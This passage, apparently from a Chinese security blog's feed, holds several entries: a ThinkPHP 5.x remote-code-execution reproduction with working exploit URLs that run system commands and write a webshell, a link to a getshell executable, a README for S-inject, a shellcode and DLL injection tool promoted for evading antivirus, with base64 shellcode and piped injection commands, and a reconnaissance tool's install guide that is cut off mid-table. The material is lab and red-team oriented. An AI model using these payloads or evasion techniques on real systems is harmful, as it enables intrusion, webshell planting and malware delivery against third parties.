      <link href="/2024/03/12/28-ThinkPHP%205.x%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/03/12/28-ThinkPHP%205.x%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="一、ThinkPHP介绍"><a href="#一、ThinkPHP介绍" class="headerlink" title="一、ThinkPHP介绍"></a>一、ThinkPHP介绍</h3><p>轻量级框架，内部OOP和面向过程代码都存在，是国人自己开发的框架。 ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式</p><h3 id="二、漏洞描述"><a href="#二、漏洞描述" class="headerlink" title="二、漏洞描述"></a>二、漏洞描述</h3><p>Thinkphp5.0版本中没有对路由中的控制器进行严格过滤，导致在没有开启强制路由的情况下可以执行系统命令。</p><h3 id="三、漏洞影响版本"><a href="#三、漏洞影响版本" class="headerlink" title="三、漏洞影响版本"></a>三、漏洞影响版本</h3><p>ThinkPHP 5.0.x &lt; 5.0.23</p><p>ThinkPHP 5.1.x &lt; 5.1.31</p><h3 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h3><p>1、搭建环境</p><p>这里使用docker直接启动vulhub靶场</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure><p>目录：thinkphp/5-rce</p><p><a href="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003445953-1286734845.png"><img src="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003445953-1286734845.png" alt="img"></a></p><p>2、访问页面</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080</span><br></pre></td></tr></tbody></table></figure><p><a href="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003530053-453642526.png"><img src="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003530053-453642526.png" alt="img"></a></p><p> 3、代码执行</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=100</span><br><span class="line"></span><br><span class="line">/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=pwd</span><br></pre></td></tr></tbody></table></figure><p>获取phpinfo信息</p><p><a href="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003645625-564520031.png"><img src="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003645625-564520031.png" alt="img"></a></p><p> 执行系统命令</p><p><a href="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003659125-605547546.png"><img src="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003659125-605547546.png" alt="img"></a></p><p> 4、写入一句话</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=加你要写入的文件内容url编码</span><br></pre></td></tr></tbody></table></figure><p><a href="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003730619-1168207008.png"><img src="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003730619-1168207008.png" alt="img"></a></p><p><a href="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003742768-1307230955.png"><img src="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003742768-1307230955.png" alt="img"></a></p><p> 蚁剑连接</p><p><a href="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003810605-1765082326.png"><img src="https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003810605-1765082326.png" alt="img"></a></p><h3 id="五、修复建议"><a href="#五、修复建议" class="headerlink" title="五、修复建议"></a>五、修复建议</h3><p>升级至最新版本</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5.x远程命令执行（getshell）测试工具</title>
      <link href="/2024/03/12/29-TP5.X%E6%BC%8F%E6%B4%9E%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8/"/>
      <url>/2024/03/12/29-TP5.X%E6%BC%8F%E6%B4%9E%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>ThinkPHP5.x远程命令执行（getshell）测试工具</p><h2 id="github链接"><a href="#github链接" class="headerlink" title="github链接:"></a>github链接:</h2><p><a href="https://github.com/xs6sx/web">https://github.com/xs6sx/web</a></p><h2 id="github下载链接"><a href="#github下载链接" class="headerlink" title="github下载链接:"></a>github下载链接:</h2><p><a href="https://github.com/xs6sx/web/blob/main/ThinkPHP_getshell-v2.exe">https://github.com/xs6sx/web/blob/main/ThinkPHP_getshell-v2.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL+Shellcode的Windows注入免杀工具</title>
      <link href="/2024/03/10/24-S-inject-%E6%96%B0%E7%9A%84%E5%85%8D%E6%9D%80/"/>
      <url>/2024/03/10/24-S-inject-%E6%96%B0%E7%9A%84%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="S-inject"><a href="#S-inject" class="headerlink" title="S-inject"></a>S-inject</h1><p>github链接:<br><a href="https://github.com/Joe1sn/S-inject">https://github.com/Joe1sn/S-inject</a></p><p>DLL+Shellcode的Windows注入免杀工具</p><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240205141410967.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240205141410967.png" alt="image-20240205141410967"></a></p><p>只是罗列各种方法，免杀搭配其他技巧中要具体灵活使用</p><p><strong>须知：</strong></p><ol><li>反射式注入参考了著名github项目：<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 该项目为反射式注入支持的DLL</li><li>Shellcode使用base64编码后的shellcode</li><li>相关测试的DLL文件在<code>Test Files</code>文件夹中</li></ol><p><strong>免责声明：</strong> 本工具仅供教育和授权测试目的使用。开发者及贡献者不支持、不鼓励也不赞成任何非法或未经授权的使用。 用户有责任确保其使用本工具的行为符合所有适用的法律法规。严禁将本工具用于任何未经授权的活动。 开发者及贡献者对使用本工具造成的任何损害或后果不承担责任。使用前请自行承担风险。 通过使用本工具，您同意这些条款，并对您的行为承担全部责任。</p><h1 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h1><ul><li><strong>[2024-3-8]</strong> 更新64位<code>CreateRemoteThread</code>为直接系统调用，方法采用<code>SysWisper3</code>项目</li></ul><h1 id="免杀效果"><a href="#免杀效果" class="headerlink" title="免杀效果"></a>免杀效果</h1><p>远程shellcode注入等功能可免杀火绒，VNC无感，可注册表添加开机自启动</p><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240216112653373.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240216112653373.png" alt="image-20240216112653373"></a></p><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240216113029381.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240216113029381.png" alt="image-20240216113029381"></a></p><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240216113432922.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240216113432922.png" alt="image-20240216113432922"></a></p><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240216113917066.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240216113917066.png" alt="image-20240216113917066"></a></p><h1 id="支持功能"><a href="#支持功能" class="headerlink" title="支持功能"></a>支持功能</h1><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240205124826998.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240205124826998.png" alt="image-20240205124826998"></a></p><p><strong>DLL注入</strong></p><ul><li>远程线程注入</li><li>反射式注入</li><li>APC调度注入</li></ul><p><strong>Shellcode注入</strong></p><ul><li>远程线程注入</li><li>APC调度注入</li><li>Context上下文注入</li><li><strong>可注入进程枚举</strong></li></ul><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>非交互式终端使用管道传参</p><ul><li>注意cmd和powershell的区别</li><li>注意cmd字符串超过80个会自动换行，推荐搭配powershell</li></ul><h2 id="Shellcode注入"><a href="#Shellcode注入" class="headerlink" title="Shellcode注入"></a>Shellcode注入</h2><p>这里以64为windows10版本Calc shellcode位例子(虽然会崩溃) shellcode来源：<a href="https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode">https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode</a> base64编码后shellcode</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SDH/SPfnZUiLWGBIi1sYSItbIEiLG0iLG0iLWyBJidiLWzxMAcNIMclmgcH/iEjB6QiLFAtMAcJNMdJEi1IcTQHCTTHbRItaIE0Bw00x5ESLYiRNAcTrMltZSDHASIniUUiLDCRIMf9BizyDTAHHSInW86Z0BUj/wOvmWWZBiwREQYsEgkwBwFPDSDHJgMEHSLgPqJaRuoeanEj30EjB6AhQUeiw////SYnGSDHJSPfhUEi4nJ6TnNGah5pI99BQSInhSP/CSIPsIEH/1g==</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240205135709302.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240205135709302.png" alt="image-20240205135709302"></a></p><p>以CobaltStrike Shellcode为例子</p><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240205140305351.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240205140305351.png" alt="image-20240205140305351"></a></p><h3 id="关于使用不可交互终端"><a href="#关于使用不可交互终端" class="headerlink" title="关于使用不可交互终端"></a>关于使用不可交互终端</h3><p>可以参考 DLL注入：B, 不可交互终端 部分，尝试利用管道加载</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#cmd</span><br><span class="line">(echo &lt;option&gt; &lt;base64 Shellcode&gt;) | &lt;S-inject Path&gt;</span><br><span class="line"></span><br><span class="line">#powershell</span><br><span class="line">echo "&lt;option index&gt;`n`&lt;pid&gt;`n`&lt;base64 Shellcode&gt;" | &lt;S-inject Path&gt;</span><br><span class="line"></span><br><span class="line">#(echo 4`n`16900`n`SDH/SPfnZUiLWGBIi1sYSItbIEiLG0iLG0iLWyBJidiLWzxMAcNIMclmgcH/iEjB6QiLFAtMAcJNMdJEi1IcTQHCTTHbRItaIE0Bw00x5ESLYiRNAcTrMltZSDHASIniUUiLDCRIMf9BizyDTAHHSInW86Z0BUj/wOvmWWZBiwREQYsEgkwBwFPDSDHJgMEHSLgPqJaRuoeanEj30EjB6AhQUeiw////SYnGSDHJSPfhUEi4nJ6TnNGah5pI99BQSInhSP/CSIPsIEH/1g==) |  D:\Github\S-inject\x64\Release\S-inject.exe</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240205140815069.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240205140815069.png" alt="image-20240205140815069"></a></p><h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><h3 id="A-可交互终端"><a href="#A-可交互终端" class="headerlink" title="A, 可交互终端"></a>A, 可交互终端</h3><p>直接在终端中启动，根据菜单选择功能即可，如枚举可注入进程</p><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240205125036362.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240205125036362.png" alt="image-20240205125036362"></a></p><h3 id="B-不可交互终端"><a href="#B-不可交互终端" class="headerlink" title="B, 不可交互终端"></a>B, 不可交互终端</h3><p>因为作者不想增加代码量，单独增添没有必要的参数功能，可以利用管道解决该问题 以下示例使用的注入对象更新前的为<code>x32dbg</code>和<code>x64dbg</code>，因为一个软件有两个位数的版本，在<code>x96dbg</code>中可以选择位数，便于测试</p><p><strong>如远程线程DLL注入</strong></p><p>x64</p><ul><li><p>powershell</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo "&lt;option index&gt;`n`&lt;DLL Path&gt;`n`&lt;PID&gt;" | &lt;S-inject Path&gt;</span><br><span class="line"></span><br><span class="line">#echo "1`n`D:\Github\S-inject\Test Files\TestDll_x64.dll`n`20176" | D:\Github\S-inject\x64\Release\S-inject.exe</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240205131438254.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240205131438254.png" alt="image-20240205131438254"></a></p></li><li><p>cmd</p><p>推荐使用powershell启动</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -c echo "&lt;option index&gt;`n`&lt;DLL Path&gt;`n`&lt;PID&gt;" | &lt;S-inject Path&gt;</span><br><span class="line"></span><br><span class="line">#powershell -c echo "1`n`D:\Github\S-inject\Test Files\TestDll_x64.dll`n`20176" | D:\Github\S-inject\x64\Release\S-inject.exe</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240205131316348.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240205131316348.png" alt="image-20240205131316348"></a></p><p>cmd.exe</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(echo &lt;option&gt; &lt;DLL Path&gt; &amp;echo &lt;PID&gt;) | &lt;S-inject Path&gt;</span><br><span class="line"></span><br><span class="line">#(echo 1 D:\Github\S-inject\Test Files\TestDll_x64.dll &amp;echo 22268) | D:\Github\S-inject\x64\Release\S-inject.exe</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/Joe1sn/S-inject/blob/main/README.assets/image-20240205135210534.png"><img src="https://github.com/Joe1sn/S-inject/raw/main/README.assets/image-20240205135210534.png" alt="image-20240205135210534"></a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>水泽-自动化信息收集工具</title>
      <link href="/2024/03/10/42-%E6%B0%B4%E6%B3%BD%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/03/10/42-%E6%B0%B4%E6%B3%BD%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="水泽-信息收集自动化工具"><a href="#水泽-信息收集自动化工具" class="headerlink" title="水泽-信息收集自动化工具"></a>水泽-信息收集自动化工具</h1><p><a href="https://github.com/0x727/ShuiZe_0x727/releases"><img src="https://camo.githubusercontent.com/c3d13271f2a667a4f699b2deb8b48ba3001c500f252fa539ac08f36a94f541c7/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f72656c656173652f30783732372f536875695a655f30783732372e737667" alt="GitHub release"></a></p><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。</p><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>作者：<a href="https://github.com/SkewwG">Ske</a></p><p>团队：<a href="https://github.com/0x727">0x727</a>，未来一段时间将陆续开源工具，地址：<a href="https://github.com/0x727">https://github.com/0x727</a></p><p>定位：协助红队人员快速的信息收集，测绘目标资产，寻找薄弱点</p><p>语言：python3开发</p><p>功能：一条龙服务，只需要输入根域名即可全方位收集相关资产，并检测漏洞。也可以输入多个域名、C段IP等，具体案例见下文。</p><p>调用：脚本借用了ksubdomain爆破子域名和theHarvester收集邮箱，感谢ksubdomain和theHarvester作者</p><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><p>为了避免踩坑,建议安装在如下环境中</p><ul><li>当前用户对该目录有写权限，不然扫描结果无法生成。root权限即可</li><li>Python环境必须是3.7以上，因为使用了异步。建议VPS环境是ubuntu20，默认是python3.8。安装模块的时候切记不要走豆瓣的源</li><li>在配置文件iniFile/config.ini里加入api（fofa、shodan、github、virustotal）</li><li>下载链接:git clone <a href="https://github.com/0x727/ShuiZe_0x727.git">https://github.com/0x727/ShuiZe_0x727.git</a></li><li>安装python库:python -m pip  install -r .\requirement.txt</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 777 build.sh</span><br><span class="line">./build.sh</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728153419131.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728153419131.png" alt="image-20210728153419131"></a></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ShuiZe.py -h</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728154929084.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728154929084.png" alt="image-20210728154929084"></a></p><h3 id="docker运行ShuiZe"><a href="#docker运行ShuiZe" class="headerlink" title="docker运行ShuiZe"></a>docker运行ShuiZe</h3><p>较多人反馈安装的时候会出现各种报错，新增通过docker运行ShuiZe</p><p>通过下面的命令安装docker，然后拉取python3.8的容器，再git clone水泽后，运行docker_build.sh即可。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io #安装docker</span><br><span class="line">#安装ubuntu18.04</span><br><span class="line">sudo docker pull yankovg/python3.8.2-ubuntu18.04 </span><br><span class="line">#运行</span><br><span class="line">sudo docker run -itd yankovg/python3.8.2-ubuntu18.04 bash</span><br><span class="line">#进入容器的bash</span><br><span class="line">sudo docker exec -it docker的ID /bin/bash</span><br><span class="line">#更新库</span><br><span class="line">sudo apt-get update</span><br><span class="line">#安装git命令</span><br><span class="line">sudo apt install git --fix-missing</span><br><span class="line">#安装vim命令</span><br><span class="line">sudo apt install vim</span><br><span class="line">#删除自带python3</span><br><span class="line">sudo rm /usr/bin/python3</span><br><span class="line">#创建新的python3链接</span><br><span class="line">sudo ln -s /usr/local/bin/python3.8 /usr/bin/python3</span><br><span class="line">#更新python的pip</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">#下载该工具</span><br><span class="line">git clone https://github.com/0x727/ShuiZe_0x727.git</span><br><span class="line">#赋予工具权限</span><br><span class="line">chmod 777 docker_build.sh</span><br><span class="line">#运行工具</span><br><span class="line">./docker_build.sh</span><br></pre></td></tr></tbody></table></figure><p>也可参考 <a href="https://github.com/1itt1eB0y">@1itt1eB0y</a> 提供的Dockerfile和docker-compose.yml构建镜像并运行</p><p>链接：<a href="https://github.com/1itt1eB0y/MyCollection/tree/master/docker/shuize">https://github.com/1itt1eB0y/MyCollection/tree/master/docker/shuize</a></p><p><strong>请自行评估安全性</strong></p><p><strong>脚本自带Linux版本的Nuclei和ksubdomain，如果是windows或者mac，需要自行更换版本。</strong></p><h2 id="0x03-效果展示"><a href="#0x03-效果展示" class="headerlink" title="0x03 效果展示"></a>0x03 效果展示</h2><p>备案反查顶级域名</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728155358378.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728155358378.png" alt="image-20210728155358378"></a></p><p>不是泛解析，调用ksubdomain爆破子域名</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728155541501-7458943.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728155541501-7458943.png" alt="image-20210728155541501"></a></p><p>theHarvest获取邮箱</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728161507035.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728161507035.png" alt="image-20210728161507035"></a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728163216047.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728163216047.png" alt="image-20210728163216047"></a></p><p>第三方数据接口 -&gt; 获取子域名</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728160705706.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728160705706.png" alt="image-20210728160705706"></a></p><p>github -&gt; 从github获取子域名，并把查询结果保存到txt，并匹配关键字获取敏感信息</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728161022348.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728161022348.png" alt="image-20210728161022348"></a></p><p>百度和必应爬虫</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728161117459.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728161117459.png" alt="image-20210728161117459"></a></p><p>证书</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728161711534.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728161711534.png" alt="image-20210728161711534"></a></p><p>子域名友链</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728161339208.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728161339208.png" alt="image-20210728161339208"></a></p><p>解析子域名A记录,检测是否CDN和整理C段的IP</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728162655684.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728162655684.png" alt="image-20210728162655684"></a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728162049962.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728162049962.png" alt="image-20210728162049962"></a></p><p>网络空间搜索引擎：Fofa和Shodan</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728162119531.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728162119531.png" alt="image-20210728162119531"></a></p><p>IP反查域名</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728162303312.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728162303312.png" alt="image-20210728162303312"></a></p><p>存活探测</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728162441132.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728162441132.png" alt="image-20210728162441132"></a></p><p>漏洞检测</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728165612314.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728165612314.png" alt="image-20210728165612314"></a></p><p>扫描结果保存在excel文件里</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728170303756.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728170303756.png" alt="image-20210728170303756"></a></p><p>excel的内容如下</p><p>备案反查顶级域名</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728163926763.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728163926763.png" alt="image-20210728163926763"></a></p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728163940918.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728163940918.png" alt="image-20210728163940918"></a></p><p>邮箱</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728164010063.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728164010063.png" alt="image-20210728164010063"></a></p><p>Github敏感信息</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728164040649.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728164040649.png" alt="image-20210728164040649"></a></p><p>爬虫</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728164146630.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728164146630.png" alt="image-20210728164146630"></a></p><p>证书</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728164211552.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728164211552.png" alt="image-20210728164211552"></a></p><p>子域名A记录和CDN</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728164316747.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728164316747.png" alt="image-20210728164316747"></a></p><p>动态链接和后台地址</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728164555141.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728164555141.png" alt="image-20210728164555141"></a></p><p>网络空间搜索引擎</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728164745820.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728164745820.png" alt="image-20210728164745820"></a></p><p>ip反查域名</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728164811422.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728164811422.png" alt="image-20210728164811422"></a></p><p>存活网站标题</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728164933353.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728164933353.png" alt="image-20210728164933353"></a></p><p>指纹和漏洞</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728165004202.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728165004202.png" alt="image-20210728165004202"></a></p><p>相关域名和C段</p><p><a href="https://github.com/0x727/ShuiZe_0x727/blob/master/imgs/image-20210728165052361.png"><img src="https://github.com/0x727/ShuiZe_0x727/raw/master/imgs/image-20210728165052361.png" alt="image-20210728165052361"></a></p><h2 id="0x04-POC编写"><a href="#0x04-POC编写" class="headerlink" title="0x04 POC编写"></a>0x04 POC编写</h2><p>POC的模板文件例子：<code>Plugins/Vul/Web/__template__.py</code></p><p>只需要在run_detect方法里调用POC的利用方法即可。</p><h2 id="0x05-使用方法"><a href="#0x05-使用方法" class="headerlink" title="0x05 使用方法"></a>0x05 使用方法</h2><table><thead><tr><th>语法</th><th>功能</th></tr></thead><tbody><tr><td>python3 ShuiZe.py -d domain.com</td><td>收集单一的根域名资产</td></tr><tr><td>python3 ShuiZe.py –domainFile domain.txt</td><td>批量跑根域名列表</td></tr><tr><td>python3 ShuiZe.py -c 192.168.1.0,192.168.2.0,192.168.3.0</td><td>收集C段资产</td></tr><tr><td>python3 ShuiZe.py -f 